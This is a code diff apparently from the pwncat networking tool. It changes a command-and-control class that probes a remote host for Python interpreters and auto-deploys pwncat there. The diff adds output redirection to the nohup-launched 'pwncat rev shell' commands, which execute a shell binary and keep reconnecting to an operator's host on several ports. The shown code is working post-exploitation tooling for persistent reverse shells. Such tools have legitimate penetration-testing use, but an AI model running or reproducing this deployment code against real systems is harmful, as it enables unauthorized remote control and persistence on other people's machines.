@@ -4748,7 +4748,7 @@ class CNC(object):
         # [1/2] 'which' method
         for name in self.__PYTHON_NAMES:
             self.print_info("Probing for: which {}".format(name))
-            response = self.remote_command("which {};".format(name), True)
+            response = self.remote_command("which {} 2>/dev/null".format(name), True)
             if response is not None and response:
                 for line in response:
                     path = StringEncoder.decode(line)
@@ -4905,7 +4905,9 @@ class CNCAutoDeploy(CNC):
         if not self.upload(local_path, remote_path):
             self.print_info("Unable to upload file. Aborting and handing over to current shell.")
             return
-        self.__start_pwncat(remote_path, cmd, host, ports)
+        stdout = self.create_remote_tmpfile()
+        stderr = self.create_remote_tmpfile()
+        self.__start_pwncat(remote_path, cmd, host, ports, stdout, stderr)
 
         # We need to wait some time for slow severs
         time.sleep(1)
@@ -4914,8 +4916,8 @@ class CNCAutoDeploy(CNC):
         self.print_info("Done. Handing over to current shell.")
         return
 
-    def __start_pwncat(self, remote_path, binary, host, ports):
-        # type: (str, str, str, List[int]) -> None
+    def __start_pwncat(self, remote_path, binary, host, ports, stdout, stderr):
+        # type: (str, str, str, List[int], Optional[str], Optional[str]) -> None
         for port in ports:
             command = []
             command.append("nohup")
@@ -4926,6 +4928,13 @@ class CNCAutoDeploy(CNC):
             command.append("--exec {}".format(binary))
             command.append("--reconn")
             command.append("--reconn-wait 1")
+            if stdout is not None and stderr is not None:
+                command.append("> {}".format(stdout))
+                command.append("2> {}".format(stderr))
+            elif stdout is not None:
+                command.append("> {} 2>&1".format(stdout))
+            elif stderr is not None:
+                command.append("> {} 2>&1".format(stderr))
             command.append("&")
             data = " ".join(command)
             print("Starting pwncat rev shell: {}".format(data))
